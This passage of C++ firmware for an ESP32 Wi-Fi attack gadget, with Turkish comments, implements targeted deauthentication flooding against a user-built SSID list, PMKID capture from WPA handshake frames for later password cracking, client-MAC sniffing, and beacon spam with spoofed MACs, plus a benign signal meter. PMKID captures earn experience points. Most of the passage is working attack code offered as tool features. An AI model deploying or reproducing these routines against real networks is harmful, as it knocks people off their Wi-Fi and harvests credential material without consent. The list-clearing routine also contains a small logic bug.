// ─── Marauder: SSID Hedef Listesi ────────────────────────

static const uint8_t SSID_LIST_MAX = 16;
static String g_ssidTargetList[SSID_LIST_MAX];
static uint8_t g_ssidTargetCount = 0;

static void marauder_ssid_list_run() {
    OptionList opts;
    for (uint8_t i = 0; i < g_ssidTargetCount; i++)
        opts.push_back({g_ssidTargetList[i], [](){}});
    opts.push_back({"[+ Add SSID]", [](){}});
    opts.push_back({"[Clear All]",  [](){}});
    opts.push_back({"Back",         [](){}});

    while (true) {
        int sel = loopOptions(opts, "SSID List (" + String(g_ssidTargetCount) + ")");
        if (sel < 0 || sel == (int)opts.size()-1) return;
        // Add
        if (sel == (int)opts.size()-3) {
            if (g_ssidTargetCount >= SSID_LIST_MAX) { dispBanner("List full (16)"); continue; }
            char buf[33] = "";
            if (charPicker(buf, 32, "Add SSID")) {
                g_ssidTargetList[g_ssidTargetCount++] = String(buf);
                opts.insert(opts.begin() + g_ssidTargetCount - 1, {String(buf), [](){}});
                dispBannerOK("Added: " + String(buf));
            }
            continue;
        }
        // Clear
        if (sel == (int)opts.size()-2) {
            g_ssidTargetCount = 0;
            opts.erase(opts.begin(), opts.begin() + g_ssidTargetCount);
            dispBannerOK("Cleared");
            return;
        }
        // Show/delete entry
        auto& s = g_ssidTargetList[sel];
        OptionList act = {
            {"Delete entry", [](){}},
            {"Back",         [](){}},
        };
        if (loopOptions(act, "SSID: " + s) == 0) {
            for (uint8_t i = sel; i < g_ssidTargetCount - 1; i++)
                g_ssidTargetList[i] = g_ssidTargetList[i+1];
            g_ssidTargetCount--;
            opts.erase(opts.begin() + sel);
            dispBannerOK("Deleted");
        }
    }
}

// ─── Marauder: Targeted Deauth (SSID list kullanarak) ────

static void marauder_targeted_deauth_run() {
    if (g_ssidTargetCount == 0) {
        dispBanner("Add SSIDs to list first");
        return;
    }
    // Scan ve listedeki SSID'lerle eşleştir
    wifiScanAll(true);
    WiFi.scanDelete();

    std::vector<APInfo*> targets;
    for (auto& ap : g_scanResults) {
        for (uint8_t i = 0; i < g_ssidTargetCount; i++) {
            if (ap.ssid == g_ssidTargetList[i]) { targets.push_back(&ap); break; }
        }
    }

    if (targets.empty()) { dispBannerWarn("No target APs in range"); WiFi.mode(WIFI_OFF); return; }

    wifiInitForRawTx();

    uint32_t pkts = 0, apIdx = 0;
    while (!readButtonLong()) {
        APInfo* ap = targets[apIdx % targets.size()];
        uint8_t bssid[6]; macFromStr(ap->bssid, bssid);
        for (uint8_t b = 0; b < g_cfg.deauthPktsPerBurst; b++)
            sendDeauthDisassoc(bssid, BROADCAST_MAC, ap->channel);
        pkts += g_cfg.deauthPktsPerBurst * 4;
        apIdx++;

        dispClear(); dispStatusBar("Targeted D+D");
        dispText(0, 12, "Targets: " + String(targets.size()));
        dispText(0, 22, "Frames: " + String(pkts));
        dispText(0, 32, ">" + ap->ssid.substring(0,18));
        dispText(0, 42, "Ch:" + String(ap->channel));
        dispText(0, 54, "[LONG] stop");
        dispCommit();
        delay(DEAUTH_INTERVAL_MS);
    }
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);
    logPush("[TARGETED_DEAUTH] targets=" + String(targets.size()) + " frames=" + String(pkts));
    dispBanner("Frames: " + String(pkts));
}

// ─── Marauder: PMKID Sniffer ─────────────────────────────

struct PMKIDEntry {
    String  apMac;
    String  clientMac;
    String  ssid;
    uint8_t pmkid[16];
    bool    valid;
    uint32_t ts;
};
static std::vector<PMKIDEntry> g_pmkidList;

static void pmkidCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    if (!pkt || pkt->rx_ctrl.sig_len < 36) return;
    uint8_t* pl  = pkt->payload;
    uint8_t  fc0 = pl[0];
    uint8_t  ftype = (fc0 >> 2) & 0x03;
    if (ftype != 2) return;
    // Check LLC+SNAP+EAPOL
    uint8_t off = ((fc0 & 0x80) ? 26 : 24);
    if (off + 8 > pkt->rx_ctrl.sig_len) return;
    if (pl[off] != 0xAA || pl[off+1] != 0xAA || pl[off+2] != 0x03) return;
    if (pl[off+6] != 0x88 || pl[off+7] != 0x8E) return;
    // EAPOL key: M1 frame carries PMKID in RSN IE
    // PMKID is at the end of M1 EAPOL: offset ~off+17+key_data_length-16
    if (pkt->rx_ctrl.sig_len < off + 99) return;
    uint16_t keyDataLen = ((uint16_t)pl[off+95] << 8) | pl[off+96];
    if (keyDataLen < 16 || off + 97 + keyDataLen > pkt->rx_ctrl.sig_len) return;

    uint8_t* keyData = pl + off + 97;
    // Look for PMKID KDE (OUI 00:0F:AC, suite 4, type 0x04DD)
    bool found = false;
    uint8_t pmkid[16];
    for (int i = 0; i + 20 <= (int)keyDataLen; i++) {
        if (keyData[i] == 0xDD && keyData[i+2] == 0x00 && keyData[i+3] == 0x0F &&
            keyData[i+4] == 0xAC && keyData[i+5] == 0x04) {
            memcpy(pmkid, keyData + i + 6, 16);
            found = true; break;
        }
    }
    if (!found) return;

    if (g_pmkidList.size() >= 32) return;
    char apMac[18], clMac[18];
    snprintf(apMac, sizeof(apMac), "%02X:%02X:%02X:%02X:%02X:%02X", pl[16],pl[17],pl[18],pl[19],pl[20],pl[21]);
    snprintf(clMac, sizeof(clMac), "%02X:%02X:%02X:%02X:%02X:%02X", pl[10],pl[11],pl[12],pl[13],pl[14],pl[15]);
    for (auto& e : g_pmkidList)
        if (e.apMac == apMac) return;
    String ssid = "";
    for (auto& ap : g_scanResults)
        if (ap.bssid == apMac) { ssid = ap.ssid; break; }
    PMKIDEntry pe;
    pe.apMac = apMac; pe.clientMac = clMac; pe.ssid = ssid;
    memcpy(pe.pmkid, pmkid, 16); pe.valid = true; pe.ts = millis();
    g_pmkidList.push_back(pe);
    logPush("[PMKID] AP=" + String(apMac));
}

static void marauder_pmkid_run() {
    g_pmkidList.clear();
    if (g_scanResults.empty()) wifiScanAll(true);

    wifiInitForRawTx();
    esp_wifi_set_promiscuous_rx_cb(pmkidCallback);

    uint8_t ch = 1;
    uint32_t lastSwitch = millis(), lastDraw = 0;

    dispClear(); dispStatusBar("PMKID Capture");
    dispText(0, 20, "Sniffing M1 frames");
    dispText(0, 34, "[LONG] stop");
    dispCommit();
    delay(500);

    while (!readButtonLong()) {
        if (millis() - lastSwitch > 300) {
            ch = (ch % 13) + 1;
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            lastSwitch = millis();
        }
        if (millis() - lastDraw > 250) {
            lastDraw = millis();
            dispClear(); dispStatusBar("PMKID Capture");
            dispText(0, 12, "Found: " + String(g_pmkidList.size()));
            dispText(0, 22, "Ch: " + String(ch));
            if (!g_pmkidList.empty()) {
                auto& e = g_pmkidList.back();
                dispText(0, 32, ">" + (e.ssid.isEmpty() ? e.apMac.substring(9) : e.ssid.substring(0,18)));
                char pmkStr[10];
                snprintf(pmkStr, sizeof(pmkStr), "%02X%02X%02X%02X", e.pmkid[0],e.pmkid[1],e.pmkid[2],e.pmkid[3]);
                dispText(0, 42, "PMKID: " + String(pmkStr) + "...");
            }
            dispText(0, 54, "[LONG] stop");
            dispCommit();
        }
        delay(15);
    }
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    WiFi.mode(WIFI_OFF);

    if (!g_pmkidList.empty()) {
        g_xpPmkidCnt++;
        xpAdd(XP_PER_PMKID);
    }
    if (g_pmkidList.empty()) { dispBannerWarn("No PMKIDs captured"); return; }

    OptionList res;
    for (auto& e : g_pmkidList) {
        String lbl = (e.ssid.isEmpty() ? e.apMac.substring(9) : e.ssid);
        char pmkStr[9]; snprintf(pmkStr, sizeof(pmkStr), "%02X%02X%02X%02X", e.pmkid[0],e.pmkid[1],e.pmkid[2],e.pmkid[3]);
        lbl += " " + String(pmkStr);
        res.push_back({lbl, [](){}});
    }
    res.push_back({"Back", [](){}});
    int sel = loopOptions(res, "PMKIDs (" + String(g_pmkidList.size()) + ")");
    if (sel >= 0 && sel < (int)g_pmkidList.size()) {
        auto& e = g_pmkidList[sel];
        dispClear(); dispStatusBar("PMKID Detail");
        dispText(0, 12, "AP: " + e.apMac);
        dispText(0, 22, "CL: " + e.clientMac);
        dispText(0, 32, "SSID: " + (e.ssid.isEmpty() ? "[?]" : e.ssid.substring(0,18)));
        char pmk[33];
        for (int i=0;i<16;i++) sprintf(pmk+i*2,"%02X",e.pmkid[i]);
        dispText(0, 42, String(pmk).substring(0,21));
        dispText(0, 52, String(pmk).substring(21));
        dispCommit();
        logPush("[PMKID_DETAIL] AP=" + e.apMac + " PMKID=" + String(pmk));
        while (!readButton()) delay(50);
    }
}

// ─── Marauder: Station List (bağlı istemcileri listele) ──

static void marauder_station_list_run() {
    // Promiscuous modda data frame kaynaklarını topla (non-AP)
    static std::vector<String> g_stations;
    g_stations.clear();
    g_sniffPkts = g_sniffData = 0;

    if (g_scanResults.empty()) wifiScanAll(true);

    wifiInitForRawTx();
    esp_wifi_set_promiscuous_rx_cb([](void* buf, wifi_promiscuous_pkt_type_t type){
        wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
        if (!pkt || pkt->rx_ctrl.sig_len < 24) return;
        uint8_t* pl = pkt->payload;
        uint8_t fc0 = pl[0];
        uint8_t ftype = (fc0 >> 2) & 0x03;
        if (ftype != 2) return;
        g_sniffData++;
        // addr2 = transmitter (likely client)
        char mac[18];
        snprintf(mac,sizeof(mac),"%02X:%02X:%02X:%02X:%02X:%02X",pl[10],pl[11],pl[12],pl[13],pl[14],pl[15]);
        String smac = mac;
        // Check it's not a known AP
        for (auto& ap : g_scanResults) if (ap.bssid == smac) return;
        if (g_stations.size() < 40) {
            for (auto& s : g_stations) if (s == smac) return;
            g_stations.push_back(smac);
        }
    });

    uint8_t ch = 1;
    uint32_t lastSwitch = millis(), lastDraw = 0;
    dispClear(); dispStatusBar("Station Sniffer");
    dispText(0, 20, "Listening for clients");
    dispText(0, 34, "[LONG] stop");
    dispCommit();
    delay(400);

    while (!readButtonLong()) {
        if (millis() - lastSwitch > 400) {
            ch = (ch % 13) + 1;
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            lastSwitch = millis();
        }
        if (millis() - lastDraw > 300) {
            lastDraw = millis();
            dispClear(); dispStatusBar("Station Sniffer");
            dispText(0, 12, "Stations: " + String(g_stations.size()));
            dispText(0, 22, "Data pkts: " + String(g_sniffData));
            if (!g_stations.empty())
                dispText(0, 32, ">" + g_stations.back().substring(9));
            dispText(0, 44, "Ch: " + String(ch));
            dispText(0, 54, "[LONG] stop");
            dispCommit();
        }
        delay(15);
    }
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    WiFi.mode(WIFI_OFF);

    if (g_stations.empty()) { dispBannerWarn("No stations found"); return; }
    OptionList res;
    for (auto& s : g_stations) res.push_back({s, [](){}});
    res.push_back({"Back", [](){}});
    loopOptions(res, "Stations (" + String(g_stations.size()) + ")");
}

// ─── Marauder: Beacon Spam (özel SSID listesiyle) ────────

static void marauder_custom_beacon_spam_run() {
    if (g_ssidTargetCount == 0) {
        dispBanner("Add SSIDs to target list first");
        return;
    }
    wifiInitForRawTx();

    uint8_t fakeMac[6] = {0x02, 0xAB, 0xCD, 0x00, 0x00, 0x00};
    uint32_t count = 0;
    uint8_t ch = 1;
    uint32_t lastDraw = 0;

    while (!readButtonLong()) {
        for (uint8_t i = 0; i < g_ssidTargetCount; i++) {
            fakeMac[3] = i;
            fakeMac[4] = (count >> 8) & 0xFF;
            fakeMac[5] = count & 0xFF;
            sendBeaconFrame(g_ssidTargetList[i], ch, fakeMac);
            delay(4);
        }
        count++;
        ch = (ch % 13) + 1;
        if (millis() - lastDraw > 300) {
            lastDraw = millis();
            dispClear(); dispStatusBar("Custom Beacon");
            dispText(0, 14, "SSIDs: " + String(g_ssidTargetCount));
            dispText(0, 24, "Rounds: " + String(count));
            dispText(0, 34, "Ch: " + String(ch));
            dispText(0, 44, g_ssidTargetList[count % g_ssidTargetCount].substring(0,20));
            dispText(0, 54, "[LONG] stop");
            dispCommit();
        }
    }
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);
    logPush("[CUSTOM_BEACON] rounds=" + String(count));
    dispBanner("Stopped: " + String(count));
}

// ─── Marauder: Signal Meter (gerçek zamanlı RSSI grafiği) ─

static void marauder_signal_meter_run() {
    if (g_scanResults.empty()) {
        wifiScanAll(true);
        WiFi.scanDelete();
    }
    if (g_scanResults.empty()) { dispBannerWarn("No APs"); return; }

    OptionList nets;
    for (auto& ap : g_scanResults)
        nets.push_back({ap.ssid.isEmpty() ? "[hidden]" : ap.ssid, [](){}});
    nets.push_back({"Back", [](){}});
    int sel = loopOptions(nets, "Signal Meter: AP");
    if (sel < 0 || sel >= (int)g_scanResults.size()) return;

    APInfo& target = g_scanResults[sel];
    static int8_t rssiHist[80];
    uint8_t histLen = 0, hi = 0;

    while (!readButtonLong()) {
        // Re-scan just this SSID
        WiFi.mode(WIFI_STA);
        int n = WiFi.scanNetworks(false, true, false, 100);
        int8_t rssi = -120;
        for (int i = 0; i < n; i++) {
            if (WiFi.BSSIDstr(i) == target.bssid) { rssi = WiFi.RSSI(i); break; }
        }
        WiFi.scanDelete();

        rssiHist[hi % 80] = rssi;
        hi++; if (histLen < 80) histLen++;

        dispClear(); dispStatusBar("Signal Meter");
        String nm = target.ssid.isEmpty() ? "[hidden]" : target.ssid;
        dispText(0, 12, nm.substring(0,20));
        dispText(0, 22, "RSSI: " + String(rssi) + " dBm");
        // Quality bar
        int8_t q = map(max(-90, (int)rssi), -90, -30, 0, 100);
        dispText(0, 32, "Quality: " + String(q) + "%");
        display.drawRect(0, 42, OLED_W, 8, SSD1306_WHITE);
        display.fillRect(0, 42, map(q, 0, 100, 0, OLED_W), 8, SSD1306_WHITE);
        // Waveform at bottom
        if (histLen > 1) {
            for (uint8_t i = 1; i < histLen && i < 80; i++) {
                int8_t r0 = rssiHist[(hi - i    + 80) % 80];
                int8_t r1 = rssiHist[(hi - i - 1 + 80) % 80];
                uint8_t y0 = 63 - map(max(-100,(int)r0), -100, -20, 0, 12);
                uint8_t y1 = 63 - map(max(-100,(int)r1), -100, -20, 0, 12);
                uint8_t x0 = OLED_W - i;
                if (x0 > 1) display.drawLine(x0, y0, x0+1, y1, SSD1306_WHITE);
            }
        }
        dispText(OLED_W-36, 52, "[LONG]");
        dispCommit();
        delay(200);
    }
    WiFi.mode(WIFI_OFF);
    logPush("[SIGNAL] AP=" + target.ssid + " last_rssi=" + String(rssiHist[(hi-1+80)%80]));
}

